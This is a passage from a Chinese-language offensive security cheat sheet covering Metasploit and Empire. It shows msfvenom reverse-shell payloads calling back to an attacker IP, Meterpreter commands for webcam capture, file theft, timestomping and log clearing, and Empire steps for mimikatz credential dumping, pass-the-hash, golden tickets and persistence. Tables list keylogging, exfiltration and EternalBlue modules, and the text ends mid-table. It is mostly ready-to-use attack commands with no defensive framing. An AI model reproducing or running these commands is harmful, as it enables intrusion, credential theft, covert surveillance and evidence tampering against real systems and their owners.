id=\"shellcode\"><a class=\"anchor\" href=\"#shellcode\">#</a> shellcode</h2>\n<pre><code>#msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.1 LPORT=11111 -f c –o /root/1.c\n#msfvenom -p cmd/unix/reverse_python LHOST=192.168.0.1 LPORT=11111 -o shell.py\n#msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.py\n#msfvenom -p cmd/unix/reverse_perl LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.pl\n#msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.rb\n#msfvenom -p cmd/unix/reverse_lua LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.lua\n</code></pre>\n<h2 id=\"-355\"><a class=\"anchor\" href=\"#-355\">#</a> </h2>\n<h2 id=\"-356\"><a class=\"anchor\" href=\"#-356\">#</a> </h2>\n<h2 id=\"msf设置监听\"><a class=\"anchor\" href=\"#msf设置监听\">#</a> msf 设置监听</h2>\n<pre><code>#use exploit/multi/handler\n#set payloadwindows/meterpreter/reverse_http 指定相应的payload\n#set LHOST 192.168.0.1\n#set LPORT 11111\n#exploit -j 后台监听\n或在exploit模块中直接使用set payload 命令指定payload\n</code></pre>\n<h2 id=\"-357\"><a class=\"anchor\" href=\"#-357\">#</a> </h2>\n<h2 id=\"meterpreter\"><a class=\"anchor\" href=\"#meterpreter\">#</a> Meterpreter</h2>\n<h2 id=\"-358\"><a class=\"anchor\" href=\"#-358\">#</a> </h2>\n<h3 id=\"交互\"><a class=\"anchor\" href=\"#交互\">#</a> 交互</h3>\n<pre><code>当攻击成功后会返回会话，使用session -l命令列出当前获取到的会话\n#session -l\n使用\n#sessions -i id 来进入一个会话进行交互\n#background 将当前会话放置后台\n#sessions -x检查心跳\n#sessions -u [ID] cmdshell升级meterpreter shell\n</code></pre>\n<h2 id=\"-359\"><a class=\"anchor\" href=\"#-359\">#</a> </h2>\n<h3 id=\"提权-2\"><a class=\"anchor\" href=\"#提权-2\">#</a> 提权</h3>\n<pre><code>提权详见提权模块\n</code></pre>\n<h2 id=\"-360\"><a class=\"anchor\" href=\"#-360\">#</a> </h2>\n<h3 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令</h3>\n<pre><code>#shell 进入目标cmdshell\n#uictl [enable/disable] [keyboard/mouse/all]  开启或禁止键盘/鼠标\n#uictl disable mouse  禁用鼠标\n#uictl disable keyboard  禁用键盘\n#webcam_list   查看摄像头\n#webcam_snap   通过摄像头拍照\n#webcam_stream  通过摄像头开启视频\n#execute -H -i -f cmd.exe 执行cmd.exe，-H不可见，-i交互 \n#execute -H -m -d calc.exe -f wce.exe -a &quot;-o 1.txt&quot; 隐藏执行\n#ps查看当前活跃进程\n#migrate pid     迁移进程\n#kill pid   #杀死进程\n</code></pre>\n<h2 id=\"-361\"><a class=\"anchor\" href=\"#-361\">#</a> </h2>\n<h3 id=\"文件操作\"><a class=\"anchor\" href=\"#文件操作\">#</a> 文件操作</h3>\n<pre><code>#pwd 查看当前目录\n#ls 列出当前目录文件\n#search -f *pass*        搜索文件\n#cat c:\\\\passwd.txt   查看文件内容\n#upload /tmp/pwn.txt C:\\\\1.txt   上传文件\n#download c:\\\\passwd.txt /tmp/  下载文件\n#edit c:\\\\1.txt  编辑或创建文件\n#rm C:\\\\1.txt 删除文件\n#mkdir folder  创建文件夹\n#rmdir folder  删除文件夹\n#lcd /tmp   #攻击者主机 切换目录\n#timestomp -v C://2.txt   #查看时间戳\n#timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt\n</code></pre>\n<h2 id=\"-362\"><a class=\"anchor\" href=\"#-362\">#</a> </h2>\n<h3 id=\"后渗透权限维持\"><a class=\"anchor\" href=\"#后渗透权限维持\">#</a> 后渗透 &amp; 权限维持</h3>\n<pre><code>路由添加，socks建立，后门建立等查看\n查看后门&amp;持久化板块\n</code></pre>\n<h2 id=\"-363\"><a class=\"anchor\" href=\"#-363\">#</a> </h2>\n<h3 id=\"清理日志\"><a class=\"anchor\" href=\"#清理日志\">#</a> 清理日志</h3>\n<pre><code>#clearev \n</code></pre>\n<h2 id=\"-364\"><a class=\"anchor\" href=\"#-364\">#</a> </h2>\n<h2 id=\"msf派生cobalt-strike和empire\"><a class=\"anchor\" href=\"#msf派生cobalt-strike和empire\">#</a> MSF 派生 Cobalt strike 和 Empire</h2>\n<h2 id=\"-365\"><a class=\"anchor\" href=\"#-365\">#</a> </h2>\n<h3 id=\"派生empire\"><a class=\"anchor\" href=\"#派生empire\">#</a> 派生 Empire</h3>\n<pre><code>Empire创建一个Listener\n创建一个stager选择windows/dll\nMSF使用\n&gt;use post/windows/manage/reflective_dll_inject \n指定session，dll的路径，进程pid\n</code></pre>\n<h2 id=\"-366\"><a class=\"anchor\" href=\"#-366\">#</a> </h2>\n<h3 id=\"派生cobalt-strike\"><a class=\"anchor\" href=\"#派生cobalt-strike\">#</a> 派生 Cobalt Strike</h3>\n<pre><code>cobalt 开启一个监听器windows/beacon_http/reverse_http\nmsf \n&gt;use exploit/windows/manage/payload_inject\n指定IP、端口、payload即可\n</code></pre>\n<h3 id=\"empire\"><a class=\"anchor\" href=\"#empire\">#</a> Empire</h3>\n<h2 id=\"-367\"><a class=\"anchor\" href=\"#-367\">#</a> </h2>\n<h2 id=\"安装\"><a class=\"anchor\" href=\"#安装\">#</a> 安装</h2>\n<pre><code>#git clone https://github.com/EmpireProject/Empire.git\n#cd Empire/setup\n#./install.sh\n</code></pre>\n<h2 id=\"-368\"><a class=\"anchor\" href=\"#-368\">#</a> </h2>\n<h2 id=\"监听\"><a class=\"anchor\" href=\"#监听\">#</a> 监听</h2>\n<pre><code>(Empire) &gt; listeners\n(Empire: listeners) &gt; uselistener http\n(Empire: listeners) &gt; info 查看参数信息\n(Empire: listeners/http) &gt; set Name y\n(Empire: listeners/http) &gt; set Host http://192.168.0.1\n(Empire: listeners/http) &gt; set Port 8080\n(Empire: listeners/http) &gt; execute\n&gt;back命令返回listeners模块\n&gt;list查看已激活的listener\n&gt;kill http删除监听\n</code></pre>\n<h2 id=\"-369\"><a class=\"anchor\" href=\"#-369\">#</a> </h2>\n<h2 id=\"生成\"><a class=\"anchor\" href=\"#生成\">#</a> 生成</h2>\n<pre><code>(Empire: listeners) &gt; usestager windows/launcher_vbs (双击tab键查看所有模块)\n(Empire: stager/windows/launcher_vbs) &gt; info\n必须设置listener的名字，可设置生成位置\n(Empire: stager/windows/launcher_vbs) &gt; set Listener y\n(Empire: stager/windows/launcher_vbs) &gt; execute\n可生成vbs，靶机执行即可上线。\n使用launcher命令直接生成powershell或python脚本\n&gt;launcher powershell Listener-Name\n使用rename对agents更名\n&gt;rename 6NMCW4ZB target1\n使用main命令放回主菜单\n&gt;list stale 列出失去权限的机器\n&gt;remove stale 去除失去权限的机器\n</code></pre>\n<h2 id=\"-370\"><a class=\"anchor\" href=\"#-370\">#</a> </h2>\n<h2 id=\"连接靶机及其他操作\"><a class=\"anchor\" href=\"#连接靶机及其他操作\">#</a> 连接靶机及其他操作</h2>\n<pre><code>&gt;interact target1 连接\n&gt;agent 返回靶机列表\n&gt;back 返回上一层\n&gt;shell net user 1 1 /add 执行系统目录格式\n&gt;mimikazt 加载模块获取密码\n&gt;creds 整理获取的密码，creds export /root/1.txt 保存密码，creds hash/plaintext，显示格式\n&gt;sc 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot\n&gt;download c:\\pass.txt 下载靶机文件到本机\n&gt;upload hacked.txt c:\\hacked.txt 上传本机文件到靶机\n</code></pre>\n<h2 id=\"-371\"><a class=\"anchor\" href=\"#-371\">#</a> </h2>\n<h2 id=\"提权-3\"><a class=\"anchor\" href=\"#提权-3\">#</a> 提权</h2>\n<pre><code>&gt;agents 列表中Username没有星号则需要提权\n&gt;bypassuac listener需指定一个监听器 提权\n&gt;usemodule privesc/ms16-032需指定一个监听器 提权\n&gt;usemodule privesc/powerup/allchecks执行所有脚本检查漏洞\n</code></pre>\n<h2 id=\"-372\"><a class=\"anchor\" href=\"#-372\">#</a> </h2>\n<h2 id=\"横向\"><a class=\"anchor\" href=\"#横向\">#</a> 横向</h2>\n<pre><code>查询域管登录机器\n&gt;usemodule situational_awareness/network/powerview/user_hunter\n</code></pre>\n<h2 id=\"-373\"><a class=\"anchor\" href=\"#-373\">#</a> </h2>\n<h3 id=\"令牌窃取-2\"><a class=\"anchor\" href=\"#令牌窃取-2\">#</a> 令牌窃取</h3>\n<pre><code>&gt;mimikatz\n&gt;creds  获取并整理hash及密码\n&gt;pth &#123;ID&#125;窃取管理员令牌\n&gt;steal_token &#123;PID&#125;\n</code></pre>\n<h2 id=\"-374\"><a class=\"anchor\" href=\"#-374\">#</a> </h2>\n<h3 id=\"会话注入\"><a class=\"anchor\" href=\"#会话注入\">#</a> 会话注入</h3>\n<pre><code>&gt;ps 查看进程\n&gt;usemodule management/psinject 设置ProcIP和Listener\n</code></pre>\n<h2 id=\"-375\"><a class=\"anchor\" href=\"#-375\">#</a> </h2>\n<h3 id=\"hash传递\"><a class=\"anchor\" href=\"#hash传递\">#</a> Hash 传递</h3>\n<pre><code>Invoke-PsExec可能会被查杀\n&gt;usemodule situational_awareness/network/powerview/find_localadmin_access 列出可PSexec横向移动的机器\n&gt;usemodule lateral_movement/invoke_psexec需设置ComputerName和Listener\n或\n&gt;usemodule lateral_movement/invoke_wmi需设置ComputerName和Listener，credID\n跨域\n父域域控：dc.zone.com\n子域域控：sub.zone.com\n子域计算机：pc.sub.zone.com\n子域普通用户：sub\\user1\n查看信任关系\n&gt;usemodule situational_awareness/network/powerview/get_domain_trust\n获取父域krbtgt SID，使用management/user_to_sid获取sid\n需设置Domain和User=krbtgt\n&gt;usemodule credentials/mimikatz/dcsync 设置UserName 子域\\krbtgt 获取子域hash\n&gt;usemodule credentials/mimikatz/golden_ticket 伪造sid \n需设置User为伪造用户 sids伪造的标识符&#123;krbtgt sid&#125;-519\n&gt;usemodule credentials/mimikatz/dcsync 获取父域krbtgt的hash\n&gt;usemodule credentials/mimikatz/golden_ticket 使用父域krbtgt进行PTH攻击，指定父域CredID，用户名和域\n&gt;shell dir \\\\dc.zone.com\\c$\n</code></pre>\n<h2 id=\"-376\"><a class=\"anchor\" href=\"#-376\">#</a> </h2>\n<h2 id=\"后门持久化\"><a class=\"anchor\" href=\"#后门持久化\">#</a> 后门 &amp; 持久化</h2>\n<h2 id=\"-377\"><a class=\"anchor\" href=\"#-377\">#</a> </h2>\n<h3 id=\"映像劫持\"><a class=\"anchor\" href=\"#映像劫持\">#</a> 映像劫持</h3>\n<pre><code>&gt;usemodule lateral_movement/invoke_wmi_debugger\n设置Listener，ComputerName(大写)，TargetBinary(sethc.exe, Utilman.exe, osk.exe, Narrator.exe, Magnify.exe)，分别是粘滞键，轻松访问，屏幕键盘，讲述人，放大镜。\n</code></pre>\n<h2 id=\"-378\"><a class=\"anchor\" href=\"#-378\">#</a> </h2>\n<h3 id=\"注入注册表启动项\"><a class=\"anchor\" href=\"#注入注册表启动项\">#</a> 注入注册表启动项</h3>\n<pre><code>&gt;usemodule persistence/elevated/registry*\n设置Listener，注册表路径RegPath [HKLM\\software\\microsoft\\windows\\currentversion\\run]\n</code></pre>\n<h2 id=\"-379\"><a class=\"anchor\" href=\"#-379\">#</a> </h2>\n<h3 id=\"计划任务\"><a class=\"anchor\" href=\"#计划任务\">#</a> 计划任务</h3>\n<pre><code>&gt;usemodule persistence/elevated/schtasks*\n设置Listener和DailyTime\n</code></pre>\n<h2 id=\"-380\"><a class=\"anchor\" href=\"#-380\">#</a> </h2>\n<h3 id=\"wmi\"><a class=\"anchor\" href=\"#wmi\">#</a> WMI</h3>\n<pre><code>&gt;usemodule persistence/elevated/wmi\n设置Listener\n</code></pre>\n<h2 id=\"-381\"><a class=\"anchor\" href=\"#-381\">#</a> </h2>\n<h3 id=\"注入ssp\"><a class=\"anchor\" href=\"#注入ssp\">#</a> 注入 SSP</h3>\n<pre><code>查看SSP章节\n</code></pre>\n<p>Collection（信息采集）</p>\n<h2 id=\"-382\"><a class=\"anchor\" href=\"#-382\">#</a> </h2>\n<h2 id=\"collection信息采集\"><a class=\"anchor\" href=\"#collection信息采集\">#</a> Collection（信息采集）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>collection/ChromeDump</td>\n<td>收集 chrome 浏览器保存的密码和浏览历史记录</td>\n</tr>\n<tr>\n<td>collection/FoxDump</td>\n<td>收集 Firefox 浏览器保存的密码和浏览历史记录</td>\n</tr>\n<tr>\n<td>collection/USBKeylogger*</td>\n<td>利用 ETW 作为键盘记录</td>\n</tr>\n<tr>\n<td>collection/WebcamRecorder</td>\n<td>从摄像头捕获视频</td>\n</tr>\n<tr>\n<td>collection/browser_data</td>\n<td>搜索浏览器历史记录或书签</td>\n</tr>\n<tr>\n<td>collection/clipboard_monitor</td>\n<td>按指定的时间间隔监视剪贴板</td>\n</tr>\n<tr>\n<td>collection/file_finder</td>\n<td>查找域中的敏感文件</td>\n</tr>\n<tr>\n<td>collection/find_interesting_file</td>\n<td>查找域中的敏感文件</td>\n</tr>\n<tr>\n<td>collection/get_indexed_item</td>\n<td>获取 Windows desktop search 索引文件</td>\n</tr>\n<tr>\n<td>collection/get_sql_column_sample_data</td>\n<td>从目标 SQL Server 返回列信息。</td>\n</tr>\n<tr>\n<td>collection/get_sql_query</td>\n<td>在目标 SQL 服务器上执行查询</td>\n</tr>\n<tr>\n<td>collection/inveigh</td>\n<td>Windows PowerShell LLMNR/mDNS/NBNS 中间人工具</td>\n</tr>\n<tr>\n<td>collection/keylogger</td>\n<td>键盘记录到 keystrokes.txt 文件中，文件位置 /downloads/agentname/keystrokes.txt/agentname</td>\n</tr>\n<tr>\n<td>collection/minidump</td>\n<td>进程的全内存转储，PowerSploit 的 Out-Minidump.ps1</td>\n</tr>\n<tr>\n<td>collection/netripper</td>\n<td>将 NetRipper 注入目标进程，该进程使用 API 挂钩以拦截来自低特权用户的网络流量和与加密相关的功能，从而能够在加密之前 / 解密之后捕获纯文本流量和加密流量。</td>\n</tr>\n<tr>\n<td>collection/ninjacopy*</td>\n<td>通过读取原始卷并解析 NTFS 结构，从 NTFS 分区卷中复制文件。</td>\n</tr>\n<tr>\n<td>collection/packet_capture*</td>\n<td>使用 netsh 在主机上启动数据包捕获。</td>\n</tr>\n<tr>\n<td>collection/prompt</td>\n<td>提示当前用户在表单框中输入其凭据，然后返回结果。</td>\n</tr>\n<tr>\n<td>collection/screenshot</td>\n<td>屏幕截图</td>\n</tr>\n<tr>\n<td>collection/vaults/add_keepass_config_trigger</td>\n<td>寻找 KeePass 配置</td>\n</tr>\n<tr>\n<td>collection/vaults/find_keepass_config</td>\n<td>此模块查找并解析 KeePass.config.xml (2.X) 和 KeePass.config.xml (1.X) 文件。</td>\n</tr>\n<tr>\n<td>collection/vaults/get_keepass_config_trigger</td>\n<td>该模块从 KeePass 2.X 配置 XML 文件中提取触发器说明</td>\n</tr>\n<tr>\n<td>collection/vaults/keethief</td>\n<td>此模块检索未锁定的 KeePass 数据库的 database mastey key 信息</td>\n</tr>\n<tr>\n<td>collection/vaults/remove_keepass_config_trigger</td>\n<td>该模块从 Find-KeePassConfig 找到的所有 KeePass 配置中删除所有触发器</td>\n</tr>\n</tbody>\n</table>\n<pre><code>&gt;usemodule collection/ tab补齐查看模块\n&gt;usemodule collection/screenshot 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot\n&gt;usemodule collection/keylogger 键盘记录，文件存储在./Empire/download/agent名字/agent.log\n&gt;usemodule situational_awareness/host/winenum 查看当前用户、AD组、剪切板内容、系统版本、共享、网络信息、防火墙规则\n&gt;usemodule situational_awareness/network/powerview/share_finder 列出域内所有共享\n&gt;usemodule situational_awareness/network/arpscan \n&gt;set Range 192.168.0.1-192.168.0.100 ARP扫描，需设置扫描网段区间\n&gt;usemodule situational_awareness/network/portscan \n&gt;set Hosts 192.168.0.1-192.168.0.100 端口扫描，需设置IP或IP段\n&gt;usemodule situational_awareness/network/reverse_dns DNS信息，需设置IP\n&gt;set Range 192.168.0.1-192.168.0.100\n&gt;usemodule situational_awareness/network/powerview/get_domain_controller 查找域控\n</code></pre>\n<h2 id=\"-383\"><a class=\"anchor\" href=\"#-383\">#</a> </h2>\n<h2 id=\"code_execution代码执行\"><a class=\"anchor\" href=\"#code_execution代码执行\">#</a> Code_execution（代码执行）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>code_execution/invoke_dllinjection</td>\n<td>使用 PowerSploit 的 Invoke-DLLInjection 将 Dll 注入您选择的进程 ID。</td>\n</tr>\n<tr>\n<td>code_execution/invoke_metasploitpayload</td>\n<td>生成一个新的隐藏 PowerShell 窗口，该窗口下载并执行 Metasploit Payload。这与 Metasploit 模块 theexploit/multi/scripts/web_delivery 互动</td>\n</tr>\n<tr>\n<td>code_execution/invoke_ntsd</td>\n<td>使用 NT Symbolic Debugger 执行 Empire launcher 代码</td>\n</tr>\n<tr>\n<td>code_execution/invoke_reflectivepeinjection</td>\n<td>使用 PowerSploit 的 Invoke-ReflectivePEInjection 进行反射 PE 注入，将 DLL/EXE 加载进 PowerShell 进程中，或者将 DLL 加载进远程进程中</td>\n</tr>\n<tr>\n<td>code_execution/invoke_shellcode</td>\n<td>使用 PowerSploit 的 Invoke--Shellcode 注入 Shellcode</td>\n</tr>\n<tr>\n<td>code_execution/invoke_shellcodemsil</td>\n<td>执行 shellcode</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-384\"><a class=\"anchor\" href=\"#-384\">#</a> </h2>\n<h2 id=\"credentials身份凭证\"><a class=\"anchor\" href=\"#credentials身份凭证\">#</a> Credentials（身份凭证）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>credentials/credential_injection*</td>\n<td>运行 PowerSploit 的 Invoke-CredentialInjection 创建具有明文凭证的登录，而不会触发事件 ID 4648 使用显式凭据尝试登录</td>\n</tr>\n<tr>\n<td>credentials/enum_cred_store</td>\n<td>从 Windows 凭据管理器中转储当前交互用户的纯文本凭据</td>\n</tr>\n<tr>\n<td>credentials/invoke_kerberoast</td>\n<td>为具有非空服务主体名称（SPN）的所有用户请求 kerberos 票据，并将其提取为 John 或 Hashcat 可用格式</td>\n</tr>\n<tr>\n<td>credentials/powerdump*</td>\n<td>使用 Posh-SecMod 的 Invoke-PowerDump 从本地系统中转储哈希</td>\n</tr>\n<tr>\n<td>credentials/sessiongopher</td>\n<td>提取 WinSCP 已保存的会话和密码</td>\n</tr>\n<tr>\n<td>credentials/tokens</td>\n<td>运行 PowerSploit 的 Invoke-TokenManipulation 枚举可用的登录令牌，并使用它们创建新的进程</td>\n</tr>\n<tr>\n<td>credentials/vault_credential*</td>\n<td>运行 PowerSploit 的 Get-VaultCredential 以显示 Windows Vault 凭证对象，包括明文 Web 凭证</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/cache*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以提取 MSCache (v2) hashes</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/certs*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数将所有证书提取到本地目录</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/command*</td>\n<td>使用自定义命令运行 PowerSploit 的 Invoke-Mimikatz 函数</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/dcsync</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数，以通过 Mimikatz 的 lsadump::dcsync 模块提取给定的帐户密码</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/dcsync_hashdump</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数，以使用 Mimikatz 的 lsadump::dcsync 模块收集所有域哈希</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/extract_tickets</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数，以 base64 编码形式从内存中提取 kerberos 票据</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/golden_ticket</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以生成黄金票据并将其注入内存</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/keys*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以将所有密钥提取到本地目录</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/logonpasswords*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以从内存中提取纯文本凭据。</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/lsadump*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以从内存中提取特定的用户哈希。 在域控制器上很有用。</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/mimitokens*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以列出或枚举令牌。</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/pth*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以执行 sekurlsa::pth 来创建一个新进程。</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/purge</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数从内存中清除所有当前的 kerberos 票据</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/sam*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数从安全帐户管理器（SAM）数据库中提取哈希</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/silver_ticket</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数，以生成服务器 / 服务的白银票据并将其注入内存。</td>\n</tr>\n<tr>\n<td>credentials/mimikatz/trust_keys*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数，从域控制器中提取域信任密钥。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-385\"><a class=\"anchor\" href=\"#-385\">#</a> </h2>\n<h2 id=\"exfiltration数据窃取\"><a class=\"anchor\" href=\"#exfiltration数据窃取\">#</a> Exfiltration（数据窃取）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>exfiltration/egresscheck</td>\n<td>可用于帮助检查主机与客户端系统之间的出口，详细信息：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N0dWZ1cy9lZ3Jlc3NjaGVjay1mcmFtZXdvcms=\">https://github.com/stufus/egresscheck-framework</span></td>\n</tr>\n<tr>\n<td>exfiltration/exfil_dropbox</td>\n<td>下载文件到 dropbox</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-386\"><a class=\"anchor\" href=\"#-386\">#</a> </h2>\n<h2 id=\"exploitation漏洞利用exp\"><a class=\"anchor\" href=\"#exploitation漏洞利用exp\">#</a> Exploitation（漏洞利用 EXP）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>exploitation/exploit_eternalblue</td>\n<td>MS17_010 永恒之蓝漏洞利用</td>\n</tr>\n<tr>\n<td>exploitation/exploit_jboss</td>\n<td>Jboss 漏洞利用</td>\n</tr>\n<tr>\n<td>exploitation/exploit_jenkins</td>\n<td>在未授权访问的 Jenkins 脚本控制台上运行命令</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-387\"><a class=\"anchor\" href=\"#-387\">#</a> </h2>\n<h2 id=\"lateral_movement横向移动\"><a class=\"anchor\" href=\"#lateral_movement横向移动\">#</a> Lateral_movement（横向移动）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>lateral_movement/inveigh_relay</td>\n<td>smb 中继攻击</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_dcom</td>\n<td>使用 DCOM 在远程主机上执行 stager</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_executemsbuild</td>\n<td>该模块利用 WMI 和 MSBuild 编译并执行一个包含 Empire launcher 的 xml 文件。</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_psexec</td>\n<td>PsExec 横向移动</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_psremoting</td>\n<td>远程 PowerShell 横向移动</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_smbexec</td>\n<td>SMBExec 横向移动</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_sqloscmd</td>\n<td>利用 xp_cmdshell 横向移动</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_sshcommand</td>\n<td>利用 SSH 横向移动</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_wmi</td>\n<td>利用 WMI 横向移动</td>\n</tr>\n<tr>\n<td>lateral_movement/invoke_wmi_debugger</td>\n<td>使用 WMI 将远程机器上的二进制文件的调试器设置为 cmd.exe 或 stager</td>\n</tr>\n<tr>\n<td>lateral_movement/jenkins_script_console</td>\n<td>利用未授权访问的 Jenkins 脚本控制台横向移动</td>\n</tr>\n<tr>\n<td>lateral_movement/new_gpo_immediate_task</td>\n<td>利用 GPO 中的计划任务横向移动</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-388\"><a class=\"anchor\" href=\"#-388\">#</a> </h2>\n<h2 id=\"management管理\"><a class=\"anchor\" href=\"#management管理\">#</a> Management（管理）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>management/enable_rdp*</td>\n<td>在远程计算机上启用 RDP 并添加防火墙例外。</td>\n</tr>\n<tr>\n<td>management/disable_rdp*</td>\n<td>在远程计算机上禁用 RDP</td>\n</tr>\n<tr>\n<td>management/downgrade_account</td>\n<td>在给定的域帐户上设置可逆加密，然后强制下次用户登录时设置密码。</td>\n</tr>\n<tr>\n<td>management/enable_multi_rdp*</td>\n<td>允许多个用户建立同时的 RDP 连接。</td>\n</tr>\n<tr>\n<td>management/get_domain_sid</td>\n<td>返回当前指定域的 SID</td>\n</tr>\n<tr>\n<td>management/honeyhash*</td>\n<td>将人工凭证注入到 LSASS</td>\n</tr>\n<tr>\n<td>management/invoke_script</td>\n<td>运行自定义脚本</td>\n</tr>\n<tr>\n<td>management/lock</td>\n<td>锁定工作站的显示</td>\n</tr>\n<tr>\n<td>management/logoff</td>\n<td>从计算机上注销当前用户（或所有用户）</td>\n</tr>\n<tr>\n<td>management/psinject</td>\n<td>利用 Powershell 注入 Stephen Fewer 形成的 ReflectivePick，该 ReflectivePick 在远程过程中从内存执行 PS 代码</td>\n</tr>\n<tr>\n<td>management/reflective_inject</td>\n<td>利用 Powershell 注入 Stephen Fewer 形成的 ReflectivePick，该 ReflectivePick 在远程过程中从内存执行 PS 代码</td>\n</tr>\n<tr>\n<td>management/restart</td>\n<td>重新启动指定的机器</td>\n</tr>\n<tr>\n<td>management/runas</td>\n<td>绕过 GPO 路径限制</td>\n</tr>\n<tr>\n<td>management/shinject</td>\n<td>将 PIC Shellcode Payload 注入目标进程</td>\n</tr>\n<tr>\n<td>management/sid_to_user</td>\n<td>将指定的域 sid 转换为用户</td>\n</tr>\n<tr>\n<td>management/spawn</td>\n<td>在新的 powershell.exe 进程中生成新 agent</td>\n</tr>\n<tr>\n<td>management/spawnas</td>\n<td>使用指定的登录凭据生成 agent</td>\n</tr>\n<tr>\n<td>management/switch_listener</td>\n<td>切换 listener</td>\n</tr>\n<tr>\n<td>management/timestomp</td>\n<td>通过 ' 调用 Set-MacAttribute 执行类似耗时的功能</td>\n</tr>\n<tr>\n<td>management/user_to_sid</td>\n<td>将指定的 domain\\user 转换为 domain sid</td>\n</tr>\n<tr>\n<td>management/vnc</td>\n<td>Invoke-Vnc 在内存中执行 VNC 代理并启动反向连接</td>\n</tr>\n<tr>\n<td>management/wdigest_downgrade*</td>\n<td>将计算机上的 wdigest 设置为使用显式凭据</td>\n</tr>\n<tr>\n<td>management/zipfolder</td>\n<td>压缩目标文件夹以供以后渗透</td>\n</tr>\n<tr>\n<td>management/mailraider/disable_security</td>\n<td>此函数检查 ObjectModelGuard</td>\n</tr>\n<tr>\n<td>management/mailraider/get_emailitems</td>\n<td>返回指定文件夹的所有项目</td>\n</tr>\n<tr>\n<td>management/mailraider/get_subfolders</td>\n<td>返回指定顶级文件夹中所有文件夹的列表</td>\n</tr>\n<tr>\n<td>management/mailraider/mail_search</td>\n<td>在给定的 Outlook 文件夹中搜索项目</td>\n</tr>\n<tr>\n<td>management/mailraider/search_gal</td>\n<td>返回与指定搜索条件匹配的所有 exchange users</td>\n</tr>\n<tr>\n<td>management/mailraider/send_mail</td>\n<td>使用自定义或默认模板将电子邮件发送到指定地址。</td>\n</tr>\n<tr>\n<td>management/mailraider/view_email</td>\n<td>选择指定的文件夹，然后在指定的索引处输出电子邮件项目</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-389\"><a class=\"anchor\" href=\"#-389\">#</a> </h2>\n<h2 id=\"persistence持久化\"><a class=\"anchor\" href=\"#persistence持久化\">#</a> Persistence（持久化）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>persistence/elevated/registry*</td>\n<td>计算机启动项持久化，通过 HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 进行持久化，运行一个 stager 